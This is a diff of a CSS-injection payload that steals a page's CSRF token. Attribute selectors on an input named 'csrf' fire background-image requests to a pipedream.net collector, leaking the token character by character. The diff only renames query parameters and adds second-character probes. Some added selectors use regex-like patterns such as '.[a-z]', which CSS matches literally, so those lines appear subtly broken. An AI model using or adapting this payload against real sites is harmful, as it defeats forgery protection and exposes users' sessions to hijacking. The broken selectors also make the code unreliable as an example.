@@ -1,28 +1,37 @@
 input[name="csrf"][value^="a"] {
-  background: url(https://en6gc9c8vfzvo.x.pipedream.net/?q=a)
+  background: url(https://en6gc9c8vfzvo.x.pipedream.net/?1=a)
 }
 
 input[name="csrf"][value^="b"] {
-  background: url(https://en6gc9c8vfzvo.x.pipedream.net/?q=b)
+  background: url(https://en6gc9c8vfzvo.x.pipedream.net/?1=b)
 }
 
 input[name="csrf"][value^="c"] {
-  background: url(https://en6gc9c8vfzvo.x.pipedream.net/?q=c)
+  background: url(https://en6gc9c8vfzvo.x.pipedream.net/?1=c)
 }
 
 input[name="csrf"][value^="d"] {
-  background: url(https://en6gc9c8vfzvo.x.pipedream.net/?q=d)
+  background: url(https://en6gc9c8vfzvo.x.pipedream.net/?1=d)
 }
 
 input[name="csrf"][value^="y"] {
-  background: url(https://en6gc9c8vfzvo.x.pipedream.net/?q=y)
+  background: url(https://en6gc9c8vfzvo.x.pipedream.net/?1=y)
 }
 
 input[name="csrf"][value^="z"] {
-  background: url(https://en6gc9c8vfzvo.x.pipedream.net/?q=z)
+  background: url(https://en6gc9c8vfzvo.x.pipedream.net/?1=z)
 }
 
+input[name="csrf"][value^=".a"] {
+  background: url(https://en6gc9c8vfzvo.x.pipedream.net/?2=a)
+}
 
-input[name="csrf"][value^="y"] + input {
-  background: url(https://en6gc9c8vfzvo.x.pipedream.net/?qq=y)
+input[name="csrf"][value^=".[a-z]"] {
+  background: url(https://en6gc9c8vfzvo.x.pipedream.net/?2=[a-z])
+}
+input[name="csrf"][value^=".[A-Z]"] {
+  background: url(https://en6gc9c8vfzvo.x.pipedream.net/?2=[A-Z])
+}
+input[name="csrf"][value^=".[0-9]"] {
+  background: url(https://en6gc9c8vfzvo.x.pipedream.net/?2=[0-9])
 }
